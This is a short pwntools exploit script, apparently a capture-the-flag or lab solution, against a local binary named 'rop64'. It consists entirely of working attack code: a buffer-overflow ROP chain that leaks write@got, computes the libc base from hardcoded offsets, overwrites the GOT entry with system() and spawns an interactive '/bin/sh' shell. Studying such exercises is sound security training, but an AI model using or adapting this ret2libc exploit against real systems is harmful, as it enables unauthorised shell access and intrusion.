from pwn import *
# 0xf7370  __write@@GLIBC_2.2.5
# 0x453a0  system@@GLIBC_2.2.5


# 0x40056a : pop rdi ; pop rsi ; pop rdx ; ret

p = process('./rop64')
e = ELF('./rop64')
# info
write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']

log.info('write@plt '+hex(write_plt))
log.info('write@got '+hex(write_got))
log.info('read@plt '+hex(read_plt))

pppr = 0x40056a

# write(1, write_got, 8)
pl = "A"*264        #buf padding
pl += p64(pppr)     # pppr
pl += p64(1)        # fd
pl += p64(write_got)    # write_got
pl += p64(8)        # 8
pl += p64(write_plt) # call write


# read(0, 0x601018, 16)
pl += p64(pppr)
pl += p64(0)
pl += p64(write_got)
pl += p64(16)
pl += p64(read_plt)

# write(0x601020, 0, 0)
pl += p64(pppr)
pl += p64(0x601020) # /bin/sh
pl += p64(0)
pl += p64(0)
pl += p64(write_plt)

print p.sendlineafter("Data: ", pl)

libc = u64(p.recv(8)[:8])

base = libc - 0xf7370
system = base + 0x453a0

p.sendline(p64(system)+"/bin/sh\x00")

p.interactive()